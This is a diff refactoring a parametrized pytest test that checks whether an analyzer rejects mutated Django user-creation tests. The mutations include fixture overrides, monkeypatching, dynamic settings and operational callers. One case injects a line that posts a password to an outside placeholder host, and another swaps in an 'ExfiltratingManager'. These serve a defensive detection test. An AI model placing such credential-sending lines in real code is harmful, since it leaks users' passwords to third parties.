@@ -3715,177 +3715,188 @@ def test_captured_django_user_role_does_not_require_request_exercise(tmp_path):
 
 
 @pytest.mark.parametrize(
-    "mutation",
+    "case",
     [
-        "outbound",
-        "fixture_override",
-        "dynamic_plugin_namespace",
-        "imported_fixture_override",
-        "plugin_fixture_override",
-        "autouse_model_mutation",
-        "create_user_monkeypatch",
-        "manager_monkeypatch",
-        "local_shadow",
-        "kwargs_expansion",
-        "operational",
-        "operational_caller",
-        "operational_alias_export",
-        "operational_module_reflection",
-        "custom_user_model",
-        "database_router",
-        "imported_user_model",
-        "dynamic_user_model",
-        "dynamic_globals_user_model",
-        "aliased_globals_user_model",
-        "optional_extra_only",
-        "star_import_operational_caller",
+        pytest.param(
+            {
+                "source": _REQUEST_USER_TEST.replace(
+                    "    assert response == username\n",
+                    "    assert response == username\n    requests.post('https://example.invalid', data=password)\n",
+                )
+            },
+            id="outbound",
+        ),
+        pytest.param(
+            {
+                "conftest": "import pytest\n@pytest.fixture\ndef django_user_model():\n    return FakeUserProvider()\n"
+            },
+            id="fixture_override",
+        ),
+        pytest.param(
+            {
+                "conftest": "_name = 'pytest_' + 'plugins'\nglobals()[_name] = ['tests.override_plugin']\n",
+                "extra_sources": {
+                    "tests/override_plugin.py": "import pytest\n@pytest.fixture\ndef django_user_model():\n    return ForeignManager()\n"
+                },
+            },
+            id="dynamic_plugin_namespace",
+        ),
+        pytest.param(
+            {
+                "conftest": "from .override_plugin import django_user_model\n",
+                "extra_sources": {
+                    "tests/override_plugin.py": "import pytest\n@pytest.fixture\ndef django_user_model():\n    return ForeignManager()\n"
+                },
+            },
+            id="imported_fixture_override",
+        ),
+        pytest.param(
+            {
+                "conftest": "from app.plugin_config import pytest_plugins\n",
+                "extra_sources": {
+                    "app/plugin_config.py": 'pytest_plugins = ["app.fixture_plugin"]\n',
+                    "app/fixture_plugin.py": "import pytest\n@pytest.fixture\ndef django_user_model():\n    return FakeUserProvider()\n",
+                },
+            },
+            id="plugin_fixture_override",
+        ),
+        pytest.param(
+            {
+                "conftest": "import pytest\n@pytest.fixture(autouse=True)\ndef change_model(settings):\n    settings.AUTH_USER_MODEL = choose_model()\n"
+            },
+            id="autouse_model_mutation",
+        ),
+        pytest.param(
+            {
+                "conftest": "import pytest\n@pytest.fixture(autouse=True)\ndef patch_create_user(monkeypatch, django_user_model):\n    monkeypatch.setattr(\n        django_user_model.objects, 'create_user', foreign_factory\n    )\n"
+            },
+            id="create_user_monkeypatch",
+        ),
+        pytest.param(
+            {
+                "source": _REQUEST_USER_TEST.replace(
+                    "def test_created_user(rf, django_user_model):",
+                    "def test_created_user(rf, django_user_model, monkeypatch):",
+                ).replace(
+                    "    user = django_user_model.objects.create_user(",
+                    "    monkeypatch.setattr(\n        django_user_model, 'objects', ExfiltratingManager()\n    )\n    user = django_user_model.objects.create_user(",
+                )
+            },
+            id="manager_monkeypatch",
+        ),
+        pytest.param(
+            {
+                "source": _REQUEST_USER_TEST.replace(
+                    '    username = "created-user"\n',
+                    '    django_user_model = supplied_provider\n    username = "created-user"\n',
+                )
+            },
+            id="local_shadow",
+        ),
+        pytest.param(
+            {
+                "source": _REQUEST_USER_TEST.replace(
+                    "username=username, password=password",
+                    'username=username, **{"password": password}',
+                )
+            },
+            id="kwargs_expansion",
+        ),
+        pytest.param(
+            {
+                "source": _REQUEST_USER_TEST.replace(
+                    "def test_created_user(", "def create_operational_user("
+                )
+            },
+            id="operational",
+        ),
+        pytest.param(
+            {
+                "extra_sources": {
+                    "app/operations.py": "from tests.test_user_flow import test_created_user\ntest_created_user(None, None)\n"
+                }
+            },
+            id="operational_caller",
+        ),
+        pytest.param(
+            {
+                "extra_sources": {
+                    "app/operations.py": "from tests.test_user_flow import test_created_user as run_fixture_test\ndef dispatch():\n    run_fixture_test(None, None)\ndef export():\n    return run_fixture_test\n"
+                }
+            },
+            id="operational_alias_export",
+        ),
+        pytest.param(
+            {
+                "extra_sources": {
+                    "app/operations.py": "import tests.test_user_flow as m\ngetattr(m, 'test_created_user')(None, User)\n"
+                }
+            },
+            id="operational_module_reflection",
+        ),
+        pytest.param(
+            {
+                "settings": _REQUEST_USER_SETTINGS
+                + "AUTH_USER_MODEL = 'app.CustomUser'\n"
+            },
+            id="custom_user_model",
+        ),
+        pytest.param(
+            {
+                "settings": _REQUEST_USER_SETTINGS
+                + "DATABASE_ROUTERS = ['app.ProductionRouter']\n"
+            },
+            id="database_router",
+        ),
+        pytest.param(
+            {
+                "settings": "from .base import AUTH_USER_MODEL\n"
+                + _REQUEST_USER_SETTINGS,
+                "extra_sources": {
+                    "app/base.py": "AUTH_USER_MODEL = 'app.CustomUser'\n"
+                },
+            },
+            id="imported_user_model",
+        ),
+        pytest.param(
+            {
+                "settings": _REQUEST_USER_SETTINGS
+                + "import os\nAUTH_USER_MODEL = os.getenv('USER_MODEL')\n"
+            },
+            id="dynamic_user_model",
+        ),
+        pytest.param(
+            {
+                "settings": _REQUEST_USER_SETTINGS
+                + "setting_name = 'AUTH_USER_' + 'MODEL'\nglobals()[setting_name] = 'accounts.CustomUser'\n"
+            },
+            id="dynamic_globals_user_model",
+        ),
+        pytest.param(
+            {
+                "settings": "from builtins import globals as namespace\n"
+                + (
+                    _REQUEST_USER_SETTINGS
+                    + "setting_name = 'AUTH_USER_' + 'MODEL'\nglobals()[setting_name] = 'accounts.CustomUser'\n"
+                ).replace("globals()[", "namespace()[")
+            },
+            id="aliased_globals_user_model",
+        ),
+        pytest.param({"project": _REQUEST_USER_EXTRA_ONLY}, id="optional_extra_only"),
+        pytest.param(
+            {
+                "extra_sources": {
+                    "app/operations.py": "from tests.test_user_flow import *\ntest_created_user(None, User)\n"
+                }
+            },
+            id="star_import_operational_caller",
+        ),
     ],
 )
-def test_django_user_role_rejects_unclosed_creation_context(tmp_path, mutation):
-    source = _REQUEST_USER_TEST
-    settings = _REQUEST_USER_SETTINGS
-    conftest = None
-    project = _REQUEST_USER_PROJECT
-    extra_sources = None
-    if mutation == "outbound":
-        source = source.replace(
-            "    assert response == username\n",
-            "    assert response == username\n"
-            "    requests.post('https://example.invalid', data=password)\n",
-        )
-    elif mutation == "fixture_override":
-        conftest = (
-            "import pytest\n"
-            "@pytest.fixture\n"
-            "def django_user_model():\n    return FakeUserProvider()\n"
-        )
-    elif mutation == "dynamic_plugin_namespace":
-        conftest = (
-            "_name = 'pytest_' + 'plugins'\n"
-            "globals()[_name] = ['tests.override_plugin']\n"
-        )
-        extra_sources = {
-            "tests/override_plugin.py": (
-                "import pytest\n@pytest.fixture\n"
-                "def django_user_model():\n    return ForeignManager()\n"
-            )
-        }
-    elif mutation == "imported_fixture_override":
-        conftest = "from .override_plugin import django_user_model\n"
-        extra_sources = {
-            "tests/override_plugin.py": (
-                "import pytest\n@pytest.fixture\n"
-                "def django_user_model():\n    return ForeignManager()\n"
-            )
-        }
-    elif mutation == "plugin_fixture_override":
-        conftest = "from app.plugin_config import pytest_plugins\n"
-        extra_sources = {
-            "app/plugin_config.py": 'pytest_plugins = ["app.fixture_plugin"]\n',
-            "app/fixture_plugin.py": (
-                "import pytest\n"
-                "@pytest.fixture\n"
-                "def django_user_model():\n    return FakeUserProvider()\n"
-            ),
-        }
-    elif mutation == "autouse_model_mutation":
-        conftest = (
-            "import pytest\n"
-            "@pytest.fixture(autouse=True)\n"
-            "def change_model(settings):\n"
-            "    settings.AUTH_USER_MODEL = choose_model()\n"
-        )
-    elif mutation == "create_user_monkeypatch":
-        conftest = (
-            "import pytest\n"
-            "@pytest.fixture(autouse=True)\n"
-            "def patch_create_user(monkeypatch, django_user_model):\n"
-            "    monkeypatch.setattr(\n"
-            "        django_user_model.objects, 'create_user', foreign_factory\n"
-            "    )\n"
-        )
-    elif mutation == "manager_monkeypatch":
-        source = source.replace(
-            "def test_created_user(rf, django_user_model):",
-            "def test_created_user(rf, django_user_model, monkeypatch):",
-        ).replace(
-            "    user = django_user_model.objects.create_user(",
-            "    monkeypatch.setattr(\n"
-            "        django_user_model, 'objects', ExfiltratingManager()\n"
-            "    )\n"
-            "    user = django_user_model.objects.create_user(",
-        )
-    elif mutation == "local_shadow":
-        source = source.replace(
-            '    username = "created-user"\n',
-            "    django_user_model = supplied_provider\n"
-            '    username = "created-user"\n',
-        )
-    elif mutation == "operational":
-        source = source.replace(
-            "def test_created_user(", "def create_operational_user("
-        )
-    elif mutation == "kwargs_expansion":
-        source = source.replace(
-            "username=username, password=password",
-            'username=username, **{"password": password}',
-        )
-    elif mutation == "operational_caller":
-        extra_sources = {
-            "app/operations.py": (
-                "from tests.test_user_flow import test_created_user\n"
-                "test_created_user(None, None)\n"
-            )
-        }
-    elif mutation == "operational_alias_export":
-        extra_sources = {
-            "app/operations.py": (
-                "from tests.test_user_flow import test_created_user as run_fixture_test\n"
-                "def dispatch():\n    run_fixture_test(None, None)\n"
-                "def export():\n    return run_fixture_test\n"
-            )
-        }
-    elif mutation == "star_import_operational_caller":
-        extra_sources = {
-            "app/operations.py": (
-                "from tests.test_user_flow import *\ntest_created_user(None, User)\n"
-            )
-        }
-    elif mutation == "operational_module_reflection":
-        extra_sources = {
-            "app/operations.py": (
-                "import tests.test_user_flow as m\n"
-                "getattr(m, 'test_created_user')(None, User)\n"
-            )
-        }
-    elif mutation == "custom_user_model":
-        settings += "AUTH_USER_MODEL = 'app.CustomUser'\n"
-    elif mutation == "database_router":
-        settings += "DATABASE_ROUTERS = ['app.ProductionRouter']\n"
-    elif mutation == "imported_user_model":
-        settings = "from .base import AUTH_USER_MODEL\n" + settings
-        extra_sources = {"app/base.py": "AUTH_USER_MODEL = 'app.CustomUser'\n"}
-    elif mutation == "dynamic_user_model":
-        settings += "import os\nAUTH_USER_MODEL = os.getenv('USER_MODEL')\n"
-    elif mutation in {"dynamic_globals_user_model", "aliased_globals_user_model"}:
-        settings += (
-            "setting_name = 'AUTH_USER_' + 'MODEL'\n"
-            "globals()[setting_name] = 'accounts.CustomUser'\n"
-        )
-        if mutation == "aliased_globals_user_model":
-            settings = "from builtins import globals as namespace\n" + settings.replace(
-                "globals()[", "namespace()["
-            )
-    else:
-        project = _REQUEST_USER_EXTRA_ONLY
-    evidence, *_ = _request_user_role_projection(
-        tmp_path,
-        source,
-        settings=settings,
-        conftest=conftest,
-        project=project,
-        extra_sources=extra_sources,
-    )
+def test_django_user_role_rejects_unclosed_creation_context(tmp_path, case):
+    source = case.get("source", _REQUEST_USER_TEST)
+    options = {key: value for key, value in case.items() if key != "source"}
+    evidence, *_ = _request_user_role_projection(tmp_path, source, **options)
     assert evidence["eligible"] is False, evidence
 
 
